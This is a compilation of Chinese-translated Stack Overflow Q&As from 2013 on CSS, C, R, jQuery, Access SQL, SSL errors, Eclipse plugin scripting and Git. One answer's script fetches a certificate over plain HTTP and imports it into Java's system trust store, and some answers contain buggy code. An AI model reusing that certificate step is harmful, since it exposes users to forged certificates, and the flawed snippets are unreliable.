RED div 应该向上和向下缩放，但是在某个点，当 RED div 达到其最小高度时，它应该停止缩放高度并且仅缩放宽度。我之前使用纯 javascript 完成了此操作，但自从我阅读了上面的帖子后，我试图获得一个仅 CSS 的解决方案。

这是代码。你现在可以忽略内容......我主要关注红色块。按比例缩放宽度/高度，直到达到最小高度，然后它应该停止缩放高度并且只缩放宽度。

HTML

```
<div style="background: blue; width: 70%;">
<div id="left">
    <div class="content"></div>
</div>
<div id="right">
</div>
</div> 
```

CSS

```
div {
    margin: 5%;
    float: left;
    background: red;
    position: relative;
}
#left {
    width: 50%;
    padding-bottom: 60%;
    min-height: 100px;
}
#right {
    width: 30%;
    padding-bottom: 60%;
    min-height: 100px;
}
.content {
    position: absolute;
    width: 90%;
    margin: 5%;
    background: green;
    top: 0;
    left: 0;
    height: 90%;
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-07T23:21:49.483

不幸的是，纯 CSS 无法在[除 IE 之外](https://stackoverflow.com/questions/7888148/css-expression-to-set-height-of-div)的所有浏览器中计算任何表达式，因此您必须至少使用一些 JavaScript 来动态计算宽度。
我可能会在你的 html 文件中做这样的事情。
由于您没有指定*如何*调整 div 的大小，我假设它只是在调整窗口大小时。

```
<body onresize="
    var left = document.getElementById('left');
    if (left.clientHeight < left.style.min-height) {
        left.style.cheight = left.style.min-height;
    }
">
</body> 
```

# c - 没有为初始化对象创建copydown？

> ID：15262555
> 
> 赞同：2
> 
> 时间：2013-03-07T03:27:48.787
> 
> 标签：c, embedded, codewarrior, 68hc12

我正在使用 codewarrior 为 HC12 进行编译，并且我有两个 120 元素数组：score 和 dur。我以典型的方式初始化它们： unsigned int score[120] = { ... }; 但是，当我尝试编译它时，我收到一个链接器错误，上面写着“L1981：没有为初始化对象“分数”创建复制。初始化数据丢失。” 我无法弄清楚这意味着什么或如何制作它，因此它会创建一个副本。请注意，当我将它们放入 main() 时，该程序可以编译并且似乎可以很好地设置值，但我需要它们是全局变量，因为它们是通过中断访问的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T13:14:48.973

有两个可能的原因：

*   您要么设法在堆栈上声明此变量（坏主意），要么在太小而无法包含它的内存段中声明。考虑通过更改 .prm 文件将此类大型变量放在专用 RAM 段中。
*   或者您已经创建了一个带有“最少”启动代码的 Codewarrior 项目。如果这样做，您将选择一个非标准设置，其中删除了具有静态存储持续时间的对象的初始化阶段。

# c++ - FireBreath WlanOpenHandle 错误 1062“服务尚未启动”

> ID：15262559
> 
> 赞同：2
> 
> 时间：2013-03-07T03:28:02.710
> 
> 标签：c++, windows, firebreath

在我的 FireBreath 插件中，我正在尝试确定 Wifi SSID 和/或扫描可见的 Wifi 接入点。

在代码的 Windows 部分中，这需要从以下内容开始：

```
dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient); 
```

不幸的是，`dwResult`总是返回：1062，翻译为“*服务尚未启动*”（通过`FormatMessage()`）。

我尝试在主线程以及启动的 boost 线程中运行，如下所示：

```
boost::thread t(boost::bind(&LaasTechAPI::doSomethingTimeConsuming_thread, this, num, callback)); 
```

无论如何，错误 1062 是相同的。

*（顺便说一句，我实现了线程方法，因为 a. Internet 搜索表明某种 ATL/MTL '公寓' 线程问题，并且 b. Wifi 扫描被认为是一种固有的缓慢异步努力，所以线程似乎一直都是必要的）*

**谁能告诉我如何解决这个 WlanOpenHandle 错误 1062 问题？**

* * *

*次要*：

*   你能告诉我一种更可靠的方法来扫描 Windows 中本地接入点的 Wifi SSID、BSSID 和信号强度吗？
*   我还必须为 OS X 收集 Wifi 信息。因此，如果您知道用于 Wifi 扫描的 Mac 或多平台解决方案，请分享。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-28T15:47:17.373

## 如何启动 Windows 零配置服务 (WZC)

这将解决 Windows 错误 1062：“服务尚未启动”。

我认为您应该更仔细地查看@Georg 的评论并验证 WZC 是否已启动。以下是他链接中备注部分的相关文本：http: [//msdn.microsoft.com/en-us/library/windows/desktop/ms706759 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms706759(v=vs.85).aspx)

> 如果无线零配置 (WZC) 服务尚未启动或 WZC 服务没有响应，WlanOpenHandle 将返回错误消息。

在 Windows 命令提示符 (DOS) 中启用服务：

```
> net start wzcsvc 
```

或者，键入：

```
> sc config wzcsvc start= <boot|system|auto|demand|disabled|delayed-auto> 
```

帮助消息：

```
> sc config /? 
```

或者，打开服务应用程序：

```
> services.msc 
```

# javascript - div id 命名结构和对 CSS 类的引用

> ID：15262561
> 
> 赞同：1
> 
> 时间：2013-03-07T03:28:16.237
> 
> 标签：javascript, css, html

我很抱歉，因为这是一个基本问题，我是 CSS 新手，但我需要快速完成一些事情，所以我希望得到一个浓缩咖啡的答案......

在我的文档中，我有想要使用命名结构 [category].[specificID] 命名的 div，它们都应该服从 [category] ​​CSS 定义。例如

```
<div id="sectionTitle.experience">Experience</div>
...

<div id="sectionTitle.education">education</div> 
```

我希望最终的 ID 是不同的，因为我希望能够灵活地进行单独的 JS 处理。但是每个 sectionTitle 的格式应该是相同的，因此是相同的 CSS 类。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:30:54.300

您可以使用 ID 和类。例如：

```
<div id="sectionTitle_experience" class="sectionTitle">Experience</div> 
```

请注意，我已将 替换为`.`a`_`以使其在 CSS 中可访问 - 否则您必须求助于类似的东西`[id='sectionTitle.experience']`而不是`#sectionTitle_experience`.

编辑：话虽这么说，如果你想要一个快速而肮脏的修复，试试这个 CSS：

```
[id^='sectionTitle.'] { /* styles here */ } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T03:31:15.403

首先，您的 ID 必须是唯一的才能拥有有效的 HTML。两个元素不能共享相同的 ID，但它们可以共享相同的类名。

另外，我“认为”您的 ID 名称中不能有 a `.`，但我可能错了。

你想要的是：

```
<div id="experience" class="sectionTitle">Experience</div> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T03:36:43.900

创建一个 css 类 .sectionTitle 并将您想要的样式放入其中。将此类传递给每个包含标题文本的 div。因此，您可以对具有不同 id 的标题具有相同的样式。

# r - 使用移动组标识符创建矩阵

> ID：15262562
> 
> 赞同：0
> 
> 时间：2013-03-07T03:28:26.220
> 
> 标签：r, matrix

我正在尝试在 R 中创建一个包含`180*12`行和`12`列的矩阵。我不确定 R 的具体代码是什么来创建这样的东西。

```
Column 1: 1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,..................0
Column 2: 0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,..................0
Column 3: 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,..................0 
```

等等。在 Column12 之前使用相同的模式。有人可以帮我吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:31:00.820

```
apply(diag(12), 2, rep, each=12) 
```

一个更短的例子：

```
apply(diag(3), 2, rep, each=2)
##      [,1] [,2] [,3]
## [1,]    1    0    0
## [2,]    1    0    0
## [3,]    0    1    0
## [4,]    0    1    0
## [5,]    0    0    1
## [6,]    0    0    1 
```

另一个非常相似的解决方案，没有明确的`apply`：

```
matrix(rep(diag(12), each=12), ncol=12) 
```

这是有效的，因为`as.vector(diag(N))`它是一个带有`N`1 的向量，每个向量用`N`0 分隔。使用 diag(3) 的示例，each=2，ncol=3 与上面的示例相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:11:53.267

只是为了笑，这是`model.matrix`@MatthewLundberg的答案的一个版本：

```
model.matrix( ~ rep(factor(1:3),each=2) - 1)

a <- rep(factor(1:3),each=2)
model.matrix( ~ a - 1)

  a1 a2 a3
1  1  0  0
2  1  0  0
3  0  1  0
4  0  1  0
5  0  0  1
6  0  0  1
attr(,"assign")
[1] 1 1 1
attr(,"contrasts")
attr(,"contrasts")$a
[1] "contr.treatment" 
```

或全部在一行中：

```
model.matrix( ~ rep(factor(1:3),each=2) - 1) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T04:15:57.447

以及来自的`class.ind`方法`nnet`

```
class.ind(rep(factor(1:3),each=2)) 
```

# jquery - 计算复选框后更新输入字段编号

> ID：15262563
> 
> 赞同：0
> 
> 时间：2013-03-07T03:28:32.423
> 
> 标签：jquery

我正在制作一个表格，并[以此](https://stackoverflow.com/questions/3519659/count-the-number-of-checked-check-boxes-and-display-them-on-a-fixed-div-using-jq)为指导计算选中的是或否的复选框。我可以得到号码，但它没有显示在输入字段中。我看到它更新查看带有萤火虫的代码。这是我缩减的测试代码。

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> 
    <script type="text/javascript">
        $(document).ready(function () {
        $("input[value=Yes]").each(function () {
        $(this).change(updateCountyes);
        });
updateCountyes();
    function updateCountyes () {
    var countyes = $("input[value=Yes]:checked").size();
    $("input#item11_number_1").text(countyes);
    $("label#item11").toggle(countyes > 0);
    };
    $("input[value=No]").each(function () {
    $(this).change(updateCountno);
    });
updateCountno();
    function updateCountno () {
    var countno = $("input[value=No]:checked").size();
    $("input#item12_number_1").text(countno);
    $("label#item12").toggle(countno > 0);
    };
    });</script>  
</head>
<body>
<input type="checkbox"  value="Yes" />Yes
<input type="checkbox"  value="No" />No
<input type="checkbox"  value="Yes" />Yes
<input type="checkbox"  value="No" />No
<div id="item11" class="fb-item fb-100-item-column">
    <div class="fb-grouplabel">
      <label style="display: inline;" id="item11_label_0">Yes</label>
    </div>
    <div class="fb-input-number">
      <input type="number" autocomplete="off" data-hint="" placeholder="" step="1" max="999999999" min="0" id="item11_number_1" name="countyes">
    </div>
  </div>

  <div id="item12" class="fb-item fb-100-item-column">
    <div class="fb-grouplabel">
      <label style="display: inline;" id="item12_label_0">No</label>
    </div>
    <div class="fb-input-number">
      <input type="number" autocomplete="off" data-hint="" step="1" max="999999999" min="0" id="item12_number_1" name="countno">
    </div>
  </div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:35:13.417

对于您想要使用的输入`val`（[请参阅文档](http://api.jquery.com/val/)）而不是`text`。所以改变这些行：

```
$("input#item11_number_1").text(countyes);
$("input#item12_number_1").text(countno); 
```

对此：

```
$("input#item11_number_1").val(countyes);
$("input#item12_number_1").val(countno); 
```

## [看演示](http://jsfiddle.net/yTsG9/)

# sql - 以版权年份范围为列标题的交叉表查询

> ID：15262565
> 
> 赞同：1
> 
> 时间：2013-03-07T03:28:48.303
> 
> 标签：sql, ms-access, ms-access-2007

我有以下数据要创建交叉表查询：

```
 ID   CallNo     CopyrightYear
 1    AH         2000
 2    AB         2000
 3    BC         2000
 4    AH         2002
 5    ZA         2005
 6    BC         2001
 7    AP         2003 
```

这是我目前拥有的交叉表查询：

```
 TRANSFORM Count(Table1.[ID]) AS CountOfID
 SELECT Table1.[CallNo], Count(Table1.[ID]) AS [Total Of ID]
 FROM Table1
 GROUP BY Table1.[CallNo]
 PIVOT Table1.[CopyrightYear]; 
```

所以我的问题是我如何将版权年份从 2000 年到 2002 年和 2003 年到 2005 年等等...

预期成绩：

```
CallNo      2000 to 2002    2003 to 2005
AB              1   
AH              2   
AP                              1
BC              2   
ZA                              1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:04:20.513

这是你的答案：

```
TRANSFORM Count(tab1.[ID]) AS CountOfID
SELECT tab1.[CallNo], Count(tab1.[ID]) AS [Total Of ID]
FROM tab1
GROUP BY tab1.[CallNo]
PIVOT CStr(Int(([CopyrightYear]+1)/3)*3-1)+' to '+CStr(Int(([CopyrightYear]+1)/3)*3+1); 
```

事实上，你可以只关注`Int(([CopyrightYear]+1)/3)*3-1`. CStr 转换主要用于装饰目的

对于 2000 年到 2004 年、2005 年到 2009 年等年，表达式将是（注意它是`5`4 年范围的值）：

```
TRANSFORM Count(tab1.[ID]) AS CountOfID
SELECT tab1.[CallNo], Count(tab1.[ID]) AS [Total Of ID]
FROM tab1
GROUP BY tab1.[CallNo]
PIVOT CStr(Int(([CopyrightYear])/5)*5)+' to '+CStr(Int(([CopyrightYear])/5)*5+4) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:16:04.503

```
SELECT CallNo,
CASE WHEN COUNT(Copyrightyear =>2000 AND <=2002) AS '2000 to 2002', COUNT(Copyrightyear => 2003 AND <=2005) AS '2003 to 2005'
FROM Table1
GROUP BY CallNo 
```

我不确定这是否可行。

# android - 中介中的广告宽度大于屏幕宽度

> ID：15262567
> 
> 赞同：0
> 
> 时间：2013-03-07T03:28:52.827
> 
> 标签：android

我使用了 Millineal 媒体，通过 android 中的 Ad mob 中介来跳转广告（使用的 adSize 常量：IAB_Banner）。我使用了绝对布局并设置了 LayoutParams 来附加 Adview。我将 layoutparams 中的 width 参数作为屏幕宽度。

但是显示的广告宽度大于屏幕宽度。（注意：如果我的布局宽度小于广告宽度，则不会显示任何广告。它在 admob medition 中给出）。

我还尝试了将 adparams 宽度设置为“MatchParent”的相对布局。但与此没有区别。（Inmobi、admob 广告在两种布局中都正确显示，不知道是不是 Millineal media/jumptap 的问题）。提前致谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T21:03:29.277

第一：不要再使用绝对布局，因为它已被弃用。

对于手机来说，广告尺寸可能太大了。我不知道您是否希望它显示在平板电脑上，但手机的标准横幅尺寸是“横幅”而不是“IAB_Banner”。看看你的 Logcat，它主要会告诉你问题是什么。

# apache - 有人可以帮我解码与 SSL 相关的堆栈跟踪吗？

> ID：15262569
> 
> 赞同：0
> 
> 时间：2013-03-07T03:29:19.637
> 
> 标签：apache, ssl, openssl

我有一个带有自签名证书的小型 HTTPServer。当我使用 Chrome 发送 GET 请求时，我得到了预期的安全异常。然后在握手期间我得到以下错误：

如何解释它？版本 32 是什么意思？SSL = 3 和 TLS = 2 ？

```
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591): Error fetching file from server., Stack Trace : javax.net.ssl.SSLException: Error occured in delegated task:javax.net.ssl.SSLHandshakeException: PROTOCOL VERSION. Unsupported client version 32
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.HandshakeProtocol.fatalAlert(HandshakeProtocol.java:319)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.HandshakeProtocol.wrap(HandshakeProtocol.java:271)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.SSLEngineImpl.wrap(SSLEngineImpl.java:695)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at javax.net.ssl.SSLEngine.wrap(SSLEngine.java:464)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler.wrapNonAppData(SslHandler.java:1018)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1137)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler.decode(SslHandler.java:814)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:422)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:268)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:255)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.socket.nio.NioWorker.read(NioWorker.java:84)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.socket.nio.AbstractNioWorker.processSelectedKeys(AbstractNioWorker.java:471)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:332)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.channel.socket.nio.NioWorker.run(NioWorker.java:35)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1088)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:581)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at java.lang.Thread.run(Thread.java:1019)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591): Caused by: org.apache.harmony.xnet.provider.jsse.AlertException: javax.net.ssl.SSLHandshakeException: PROTOCOL VERSION. Unsupported client version 32
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.HandshakeProtocol.fatalAlert(HandshakeProtocol.java:308)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.ServerHandshakeImpl.processClientHello(ServerHandshakeImpl.java:356)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.ServerHandshakeImpl$1.run(ServerHandshakeImpl.java:124)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.ServerHandshakeImpl$1.run(ServerHandshakeImpl.java:122)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at java.security.AccessController.doPrivileged(AccessController.java:182)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.apache.harmony.xnet.provider.jsse.DelegatedTask.run(DelegatedTask.java:52)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler$2.run(SslHandler.java:1258)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.ImmediateExecutor.execute(ImmediateExecutor.java:31)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler.runDelegatedTasks(SslHandler.java:1255)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     at org.jboss.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1140)
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     ... 12 more
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591): Caused by: javax.net.ssl.SSLHandshakeException: PROTOCOL VERSION. Unsupported client version 32
05-07 10:16:12.510: W/HttpDefaultRequestHandler(26591):     ... 22 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:01:53.007

第 32 版：

3 => 协议的主要版本号
2 => 协议的次要版本号（这似乎等于 SSLv3 的 0 和 TLSv1 的 1 和*2 尚未定义*，这就是您出现错误的原因）

参考：

1.  草案 - [SSL 协议 3.0 版](http://www.mozilla.org/projects/security/pki/nss/ssl/draft302.txt)
2.  源代码 - [ProtocolVersion.java](http://www.java2s.com/Open-Source/Android/android-core/platform-libcore/org/apache/harmony/xnet/provider/jsse/ProtocolVersion.java.htm)
3.  SourceCode - [ServerHandshakeImpl.java](http://gitorious.org/ginger/libcore/blobs/d11a65b017fde8c4c997f41ee59e87e90d68b3f5/x-net/src/main/java/org/apache/harmony/xnet/provider/jsse/ServerHandshakeImpl.java)
4.  源代码测试 - [ProtocolVersionTest.java](http://svn.apache.org/repos/asf/harmony/enhanced/java/trunk/classlib/modules/x-net/src/test/impl/java/org/apache/harmony/xnet/tests/provider/jsse/ProtocolVersionTest.java)

# eclipse - 如何从脚本安装 Eclipse 插件列表？

> ID：15262572
> 
> 赞同：21
> 
> 时间：2013-03-07T03:29:46.750
> 
> 标签：eclipse, eclipse-plugin, eclipse-cdt

我需要一种方法来从 linux 中的脚本以完全无人值守的方式设置高度定制的 eclipse 编码环境。定制的 eclipse 环境需要安装大约 10 个不同来源的插件（protobuf、pydev、cmakeed、openinterminal、egit、yaml、webpageeditor 等）。每次使用 gui 手动执行此操作需要 20-30 分钟。我想在脚本中自动安装插件，这样任何运行 linux 的人都可以使用一组自定义插件重新创建我的 eclipse 环境，而无需人工交互。有人对如何做到这一点有建议吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-07T08:11:35.980

以下是安装一些我最喜欢的插件的命令行片段（在 Eclipse Indigo 3.7 上测试）......诀窍是找出包的“installIU”参数的值......如果 Eclipse GUI 将显示这个在安装程序窗口中选择所需的包后，单击“更多”链接。

[**cmakeed** - CMake 编辑器](http://cmakeed.sourceforge.net/)

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://cmakeed.sourceforge.net/eclipse/ -installIU com.cthing.cmakeed.feature.feature.group 
```

[**OpenInTerminal** - 在上下文菜单中添加选项](http://code.google.com/p/eclipse-openinterminal/)

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://eclipse-openinterminal.googlecode.com/svn/trunk/site/ -installIU OpenInTerminal.feature.group 
```

[**protobuf-dt** - Google Protobuffer 编辑器](https://code.google.com/p/protobuf-dt/)

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://download.eclipse.org/modeling/tmf/xtext/updates/composite/releases/,http://protobuf-dt.googlecode.com/git/update-site -installIU com.google.eclipse.protobuf.feature.group 
```

[**yedit** - YAML 编辑器](http://code.google.com/p/yedit/)

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://dadacoalition.org/yedit -installIU org.dadacoalition.yedit.feature.group 
```

[**shelled** - Bash 脚本编辑器](http://sourceforge.net/projects/shelled/)

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://download.eclipse.org/technology/dltk/updates/,https://sourceforge.net/projects/shelled/files/shelled/update/ -installIU net.sourceforge.shelled.feature.group 
```

**网页编辑器**

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/ -installIU org.eclipse.jst.webpageeditor.feature.feature.group 
```

**Pydev**
Pydev 很棘手，因为它需要先安装证书......这是一个自动化该步骤的脚本：

```
#!/usr/bin/python
# Add PyDev's certificate to Java's key and certificate database
# Certificate file here: http://pydev.org/pydev_certificate.cer
import os, sys, pexpect, urllib2
def main():
  # NOTE: You may have to update the path to your system's cacerts file
  certs_file = '/usr/lib/jvm/default-java/jre/lib/security/cacerts'  
  pydev_certs_url = 'http://pydev.org/pydev_certificate.cer'
  print "Adding pydev_certificate.cer to %s" % (certs_file)
  pydev_cert = open('pydev_certificate.cer', 'w')
  pydev_cert.write(urllib2.urlopen(pydev_certs_url).read())
  pydev_cert.close()
  cmd = "keytool -import -file ./pydev_certificate.cer -keystore %s" % (certs_file)
  child = pexpect.spawn(cmd)
  child.expect("Enter keystore password:")
  child.sendline("changeit")
  if child.expect(["Trust this certificate?", "already exists"]) == 0:
    child.sendline("yes")
  try:
    child.interact()
  except OSError:
    pass  
  print "done"

if __name__ == "__main__":
  main() 
```

然后你可以运行：

```
eclipse -nosplash -application org.eclipse.equinox.p2.director -repository http://download.eclipse.org/releases/indigo/,http://pydev.org/updates/ -installIU org.python.pydev.feature.feature.group 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-07T05:06:44.207

您可以使用[p2 director 应用程序](http://help.eclipse.org/juno/index.jsp?topic=/org.eclipse.platform.doc.isv/guide/p2_director.html)通过脚本安装 Eclipse 功能。这里还有一些可能会有所帮助[的](http://wiki.eclipse.org/Equinox_p2_director_application/Examples/Install_into_eclipse_using_SDKProfile) [链接。](http://www.vogella.com/blog/2012/04/04/installing-eclipse-features-via-the-command-line-with-the-p2-director/)

# struct - C++ 在结构 (Struct) 中使用指针

> ID：15262576
> 
> 赞同：0
> 
> 时间：2013-03-07T03:30:52.347
> 
> 标签：struct, dynamically-generated, member-function-pointers

## 我正在尝试创建一个程序，询问用户他们有多少婴儿，收集有关每个婴儿的输入，然后将其显示在控制台上。我已经完成了 90% 的路，但我被卡住了。

控制台上的输入/输出应该是这样的；

请输入婴儿数量：2

请输入宝宝#1的身高：21.5

请输入宝宝#2的身高：19.75

宝贝 #1 的信息：身高：21.5 英寸

宝贝 #2 的信息：身高：19.75 英寸

我的代码输出一直显示 19.75 作为两个婴儿的身高。我意识到我可能需要使用指针为 aBaby.height 动态分配不同的值，但我之前没有在结构中使用过指针。任何帮助将不胜感激。

```
#include <iostream>
using namespace std;

struct Baby {
double length;
};
int main ()
{    
int iNumBaby = 0;

cout<<"Please enter the number of babies: ";
cin>>iNumBaby;
cout<<endl;
Baby aBaby;

Baby* pBaby = new Baby[iNumBaby];

for(int i = 0; i < iNumBaby; i++)
{
cout << "Please enter baby #"<< i + 1 <<"'s height <inches>: ";
cin >> aBaby.length;
cout << "\n";
}  
for(int i = 0; i < iNumBaby; i++)
{
cout << "\Baby #"<<i + 1<<"'s info:\n";
cout << "Height: " <<aBaby.length<<" inches"<<endl;
cout << "\n";
}
system("PAUSE");  
delete[] pBaby;
return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:41:39.570

这与指针无关，您的代码中只是有一个错误。请参见以下块：

```
for(int i = 0; i < iNumBaby; i++)
{
    cout << "Please enter baby #"<< i + 1 <<"'s height <inches>: ";
    cin >> aBaby.length;
    cout << "\n";
} 
```

这里的主要问题是您`aBaby.length`每次都在存储条目。事实上，您从未`pBaby`在代码中的任何地方使用过。我假设这就是你想要的：

```
for(int i = 0; i < iNumBaby; i++)
{
    cout << "Please enter baby #" << i + 1 << "'s height <inches>: ";
    cin  >> pBaby[i].length;
    cout << "\n";
}

for(int i = 0; i < iNumBaby; i++)
{
    cout << "Baby #" << i + 1 <<"'s info:\n";
    cout << "Height: " << pBaby[i].length << " inches" << endl;
    cout << "\n";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:42:04.727

```
for(int i = 0; i < iNumBaby; i++)
{
cout << "Please enter baby #"<< i + 1 <<"'s height <inches>: ";
cin >> aBaby.length;
cout << "\n";
} 
```

问题在于您对 aBaby.length 的分配。您将每个婴儿的长度分配给同一个对象。尝试访问您创建的婴儿数组并更改它们的长度。例子：

```
cin >> pBaby[i].length 
```

# eclipse - EGIT 拒绝非快进

> ID：15262582
> 
> 赞同：6
> 
> 时间：2013-03-07T03:31:03.473
> 
> 标签：eclipse, egit

我正在使用 Eclipse 4.2.1 (Java) 并尝试使用 EGIT。我的账户都是在 Github 上设置的。没有其他人正在研究它，因此没有任何变化。我有一个非常简单的项目，其中包含一个带有一个打印语句的文件。我创建了本地仓库并添加了项目。（项目浏览器显示：[gitrepo1 master]）

在项目资源管理器中：右键单击项目-> 团队-> 远程-> 推送但我得到：master: HEAD [rejected - non-fast-forward]

我已经配置了推送：Branch -> master URI -> ssh.git@github.... Ref mappings -> HEAD:/refs/heads/master

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-02-18T14:24:54.420

我们遇到了这个问题，因为我们在推送后修改了一个提交。

解决方案是合并 origin/master（在 Branches > Remote tracking 中），然后推送。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T03:49:40.500

egit 通过使用 jgit 工作，它是使用 java 的 git 实现。最好的办法是验证 repo 是否适用于普通的 git 客户端。从您的问题中，不可能确切地知道事情是如何配置的。

当您收到错误消息说您无法进行推送时，因为它不是快进，这意味着您需要先进行拉动，然后再进行推送，所以尝试一下。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-10T19:20:21.267

现在明白了，不知道我做错了什么。我刚刚重新开始观看此视频：[http ://www.youtube.com/watch?v=U1kXlahkwd4](http://www.youtube.com/watch?v=U1kXlahkwd4)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-08-31T14:15:31.203

与 Bernát 相同的原因：我在推送后修改了一个提交。由于冲突，合并失败。

我的出路：上下文菜单“团队/重置”选择“远程跟踪”/“原点主”选项“混合”。之后，我自上次推送以来的所有更改都被标记，我可以提交和推送。

# c - c 中用于读取（几乎）任意 txt 数据行的通用结构

> ID：15262588
> 
> 赞同：0
> 
> 时间：2013-03-07T03:31:49.560
> 
> 标签：c

我想从文本文件中读取数字数据行。该行有两部分：第一部分是一个索引，可以是一个整数，两个整数，...或根本没有整数！第二部分可以是整数、双精度或浮点类型的一个或两个数字。

从文件的标题中，我知道会发生什么，但是如何在没有 if/casing 几十个案例的情况下在 C 中通常读取这些行？我想到了联合、X 宏、枚举……等等。为了增加这个问题，我不能指向 C 中的数据类型，因为我在想，一旦我可以确定我的案例，我就可以指向一个适当的数据类型。至少我可以指向一个函数。

目标是将数据简单地加载到内存中。我想使用结构，但不，我想我只会指向每个部分。

我对C的要求太多了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:26:20.513

你真的只有包含 1 到 4 个数字的行。所以：

```
char line[LINE_MAX]; // populate this somehow
double values[4];
int count = sscanf(line, "%f %f %f %f", &values[0], &values[1], &values[2], &values[3]);
// now count tells you how many values were read, so ignore the others 
```

